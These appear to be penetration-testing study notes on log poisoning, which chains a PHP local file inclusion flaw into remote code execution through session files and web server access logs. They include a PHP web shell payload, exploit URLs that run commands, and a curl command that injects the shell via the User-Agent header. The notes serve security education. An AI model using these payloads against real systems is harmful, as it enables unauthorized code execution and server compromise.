# Log Poisoning

## 1. Overview

**Log Poisoning** is a technique used to achieve **Remote Code Execution (RCE)** by injecting attacker-controlled code into a log or session file and then including that file through a **Local File Inclusion (LFI)** vulnerability.

### Core concept

1. Identify an LFI vulnerability.
2. Find a file that records data we can control.
3. Inject PHP code into that file (**poisoning**).
4. Include the poisoned file through the LFI vulnerability.
5. If PHP executes the injected code, execute commands on the target system.

### Requirements

* A file inclusion vulnerability, typically LFI.
* The application must be able to read the target file.
* The inclusion mechanism must execute the injected PHP code.
* The attacker must be able to control data written into the file.

> **Key exam concept:** Reading a file is not the same as executing its contents. RCE requires the inclusion mechanism to interpret the injected code.

| Technology | Function                       | Read Content | Execute Code | Remote URL |

## 3. PHP Session Poisoning

### 3.1 How PHP sessions work

PHP applications commonly use a `PHPSESSID` cookie to identify a user's session. Session data is stored in a server-side file.

| Operating system | Session directory        |
| ---------------- | ------------------------ |
| Linux            | `/var/lib/php/sessions/` |
| Windows          | `C:\Windows\Temp\`       |

The filename uses the `sess_` prefix followed by the session ID.

**Example**

If the cookie is:

```text
PHPSESSID=el4ukv0kqbvoirg7nkp4dncpk3
```

The corresponding Linux session file is:

```text
/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3
```

The actual session ID varies between sessions. Always use the value from your own authorized lab session.

### 3.2 Step 1 — Identify the session file

Inspect the browser's cookies and locate the `PHPSESSID` value.

Example session ID:

```text
nhhv8i0o6ua4g88bkdl9u1fdsd
```

Attempt to include the corresponding file through the LFI parameter:

```text
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

If the application allows it, the session file's contents will be displayed.

### 3.3 Step 2 — Find controllable session data

The example session contains two values:

* `page` — stores the selected language page.
* `preference` — stores the language preference.

The `page` value is controllable through the `language` parameter. This makes it a potential injection point.

Test whether the value changes by visiting:

```text
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

Then include the session file again:

```text
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

If the session file now contains `session_poisoning`, the test confirms that the parameter controls the stored value.

### 3.4 Step 3 — Poison the session with PHP code

The source uses this URL-encoded PHP web shell:

```php
<?php system($_GET["cmd"]);?>
```

URL-encoded form:

```text
%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

In the authorized lab, submit it through the vulnerable parameter:

```text
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

This attempts to write PHP code into the session's `page` value.

### 3.5 Step 4 — Include the poisoned session

Include the session file and supply a command through the `cmd` parameter:

```text
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

If the target meets the required conditions, the included PHP code executes the command.

**Important limitation:** The example notes that including the session file with a different `language` value can overwrite the poisoned content. The attacker may need to poison it again for subsequent commands.

In an authorized assessment, the resulting access could be used to demonstrate impact or establish a controlled interactive session, subject to the engagement's scope.

## 4. Server Log Poisoning

### 4.1 Concept

Web servers such as Apache and Nginx maintain logs containing request information.

Common examples include:

* `access.log`
* `error.log`

An access log may record the HTTP request's `User-Agent` header. Since a client can control this header, it may be possible to inject text or code into the log.

The general process is:

1. Identify a log file readable through the LFI vulnerability.
2. Confirm that the log records a controllable field.
3. Send a request containing a controlled `User-Agent`.
4. Include the resulting log through LFI.
5. If PHP interprets the injected code, demonstrate the resulting impact.

### 4.2 Common log locations

| Server | Operating system | Common directory        |
| ------ | ---------------- | ----------------------- |
| Apache | Linux            | `/var/log/apache2/`     |
| Apache | Windows          | `C:\xampp\apache\logs\` |
| Nginx  | Linux            | `/var/log/nginx/`       |
| Nginx  | Windows          | `C:\nginx\log\`         |

The exact file location and permissions depend on the server configuration.

### 4.3 Step 1 — Test whether a log is readable

Example for an Apache access log:

```text
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

If accessible, the log may show information such as:

* Remote IP address
* Requested resource
* HTTP response code
* `User-Agent` header

**Permissions matter:**

* The source notes that Nginx logs are often readable by low-privileged users such as `www-data`.
* Apache logs may require elevated privileges or membership in groups such as `root`/`adm`, although older or misconfigured systems may expose them.

Do not assume a log is accessible solely because its path is known.

### 4.4 Step 2 — Verify control over the User-Agent

Using Burp Suite:

1. Intercept an HTTP request to the target.
2. Modify its `User-Agent` header to a recognizable test string, such as:

```http
User-Agent: Apache Log Poisoning
```

3. Send the request.
4. Include the access log through the LFI parameter again.
5. Check whether the test string appears in the log.

This confirms that the chosen request field is being recorded.

**Exam note:** The request used to poison the log does not necessarily have to be the LFI request. Any request that gets logged may work if it records the controlled value.

### 4.5 Step 3 — Understand the PHP injection mechanism

The source demonstrates a PHP command-execution payload in the `User-Agent` header:

```php
<?php system($_GET['cmd']); ?>
```

A request can be sent using cURL with a custom header:

```bash
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

The request attempts to place the PHP code into the server's access log.

Once the code has been recorded, the log must be included through the vulnerable application. If the inclusion executes PHP and the payload is interpreted, the `cmd` parameter can be used to demonstrate command execution in the lab.

### 4.6 Operational caution

Log files may be very large. Including them through LFI can lead to slow responses or, in extreme cases, affect server stability.

During an authorized assessment:

* Confirm the file and permissions before repeatedly including it.
* Avoid unnecessary requests.
* Prefer targeted tests.
* Stop if the test begins affecting service availability.

## 5. Alternative Files and Log Poisoning Targets

If standard server logs cannot be read, the source identifies other potential files.

### 5.1 Linux process files

```text
/proc/self/environ
/proc/self/fd/N
```

The `User-Agent` header may be represented in process-related data, depending on the environment.

For `/proc/self/fd/N`, the source suggests checking descriptor numbers where `N` is commonly between `0` and `50`. Access depends on permissions and the process configuration.

### 5.2 Other service logs

| Log file              | Potential source of controllable data |
| --------------------- | ------------------------------------- |
| `/var/log/sshd.log`   | SSH-related activity                  |
| `/var/log/mail`       | Mail-related activity                 |
| `/var/log/vsftpd.log` | FTP-related activity                  |

The general idea is to identify a log that:

1. Is readable through the LFI vulnerability.
2. Records an input controlled by the tester.
3. Can be included in a context where injected PHP code executes.

Examples described by the source include testing whether an SSH or FTP username, or email content, is recorded in a readable log.

**Important:** These paths and logging behaviors are environment-dependent. Verify them in the target lab rather than assuming they exist or are readable.
